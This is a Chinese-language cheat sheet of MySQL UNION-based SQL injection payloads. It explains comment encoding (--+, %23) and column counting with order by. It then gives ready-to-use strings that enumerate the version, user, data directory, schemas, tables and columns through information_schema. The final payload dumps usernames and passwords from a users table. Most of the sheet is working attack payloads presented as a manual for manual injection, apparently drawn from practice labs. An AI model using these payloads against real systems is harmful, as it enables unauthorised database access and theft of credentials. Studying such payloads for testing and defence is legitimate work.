# MYSQL 注入

- 常见注释：
```mysql
--+ 等同于-- -
%23 表示#号 get方式提交参数时需要手动进行编码处理
```

>解释：
说明一下：我们在注入的时候，为什么使用的%23而不是#，因为由于编码的问题，在浏览器中直接提交#会变成空，所以我们使用url编码后的#，即%23，当传输到后端时，后端语言会对它自动解码成#，才能够成功带入数据库查询。

+ 查询字段：
```mysql
order by 1  表示查询当前查询库（表存在多少个列）
```

------------------

+ 信息收集
在爆出的字段值里面可以替换为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:MySQL常用的系统函数

```mysql
version()             #MySQL版本
user()                #数据库用户名
database()            #数据库名
@@datadir             #数据库路径
@@version_compile_os  #操作系统版本
```

- 联合查询
UNION SELECT 联合查询，手工注入经典语句
- 查询当前数据库名
```mysql
SELECT 1,2,3 
```
这段语句本身没有任何意义，所以页面按返回正常。
为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段
```mysql
and 1=2 UNION SELECT 1,database(),3 --+
```
- 查询mysql版本
```mysql
and 1=2 UNION SELECT 1,2,version() --+
```
- 查询数据库用户和路径
```mysql
and 1=2 UNION SELECT 1,user(),@@datadir --+
```


----------
- 暴库方法一

Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息
```mysql
and1=2 union select 1,SCHEMA_NAME,3,4,5,6,7,8,9 from information_schema.SCHEMATA limit 0,1 获取第一个数据库
and1=2 union select 1,SCHEMA_NAME,3,4,5,6,7,8,9 from information_schema.SCHEMATA limit 1,1
```

通过改变上语句limit 1,1 1前面的1 而爆出不同的数据库名


----------
- 暴库
查询所有数据库有时候忍不住想看下其他的数据库的内容，可以用这个语句查询所有的数据库
```mysql
and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+
```

- 爆表名
```mysql
and 1=2 UNION SELECT 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database() --+
```

- 单引号-数据库  指定数据库进行爆表
```mysql
and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+
```
hex编码数据库名
使用火狐自带的HackBar插件可以快速的进行hex编码
hex编码后在前面加上0x表明这里是16进制编码 ，同理这些方法放到查询数据库的列名中也是可以使用的。

- 爆字段
```mysql
and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```
- 爆字段内容
```mysql
and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+
```
